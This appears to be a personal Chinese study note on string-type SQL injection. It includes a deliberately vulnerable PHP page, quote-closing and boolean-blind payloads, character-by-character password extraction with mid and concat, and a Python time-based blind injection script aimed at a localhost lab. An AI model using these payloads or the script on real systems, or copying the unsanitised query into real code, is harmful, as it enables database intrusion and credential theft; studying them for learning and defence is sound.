# blablabla

Alt+Z vscode内设置单行自适应窗口宽度换行

来看看字符串类型的sql注入：

```sql
<?php
    $conn = mysqli_connect("localhost","root","kali","test");
    $res = mysqli_query($conn, "SELECT title, content FROM wp_news WHERE id='".$_GET['id']."'");
    $row = mysqli_fetch_array($res);
    
    echo "<center>";

    echo "<h1>".$row['title']."</h1>";

    echo "<br>";
    
    echo "<h1>".$row['content']."</h1>";

    echo "</center>";
?>
```

这种情况下，加了引号来限制类型，因此

?id=2-1 等价于id=2
?id=3-2 等价于id=3
?id=2a 等价于id=2

因为php会自动把字符串想办法变成数，因此导入id=3-2时页面输出会是空，由此我们便可以推理出写代码的人加了引号来限制简单的sql注入

一种很自然（并非自然）的想法是提前闭合表达式中的引号，比如：

?id=2%27%23 (?id=2'#) 代入之后实际sql命令变成：

```sql
SELECT title, content FROM wp_news WHERE id='2'#'
```

因为#后面的东西会被注释掉，所以实际效果和id=2是一样的

在此基础上，利用布尔表达式我们可以进行一些别的操作比如：

?id=1' and '1 (因为懒直接写了转译后字符，实际应用写url编码)

这样实际上和id=1等价，因为后面的1被转换成bool里的true

类似的令：

?id=1' and 'a

这样不会有任何输出，因为a被转译为bool里的false

利用这种特性可以试验一些关键变量的正确值，因为只要给id表达式的and后面连接判断表达式sensitive_data='a'之类的，就可以知道其值是否等于'a',不然则没有输出。

?id=1' and sensitive_data='a

↑像这样

这样当然很慢，我们可以用范围来猜测，转译后的表达式形如：

'a'<sensitive_data<'n'

对于更复杂的字符串，我们可以使用mysql里的字符串工具来处理：

substr(str, start, length) 从原字符串str的start开始（从1开始）截取长度为Length的子串（默认一直到尾）

别名有mid()和substring()

concat(a, b, c, ...) 用于将多个字符串拼接成一个长字符串

因此我们就可以一位位的去这样子猜测user_pwd:

(select mid((select concat(user, 0x7e, pwd) from wp_user),1,1))='a'#

这样子可以试一下第一位是不是'a'，因此利用穷举法便可以试出（并不长的）密码

如果要脚本化流程，还可以通过运行时间来判断我们的boolean条件是否符合，这在一些界面响应固定的情况下效果很好：

select ... from ... where id='1' or sleep(1)

if(substr(user(),1,1)='r', sleep(5), 0)

结合if()可以放在payload中用时间来判断字符串等或不等

```python
import requests
import time

# 目标URL，INJECT_HERE 替换为注入内容
url = "http://localhost/vuln.php?id="

# 要测试的payload，判断数据库名第一个字母是否是 'a'
payload = "1' AND IF(SUBSTRING(DATABASE(),1,1)='a', SLEEP(5), 0)-- "

# 构造完整的注入URL
full_url = url + requests.utils.quote(payload)

# 记录请求前时间
start = time.time()

# 发送请求
response = requests.get(full_url)

# 记录请求后时间
end = time.time()

# 计算响应时间
delay = end - start

if delay > 4:
    print("条件为真（猜测成功）！数据库名第1个字符是 'a'")
else:
    print("条件为假（猜测失败）！数据库名第1个字符不是 'a'")

print(f"响应时间：{delay:.2f} 秒")
```

简单的利用脚本
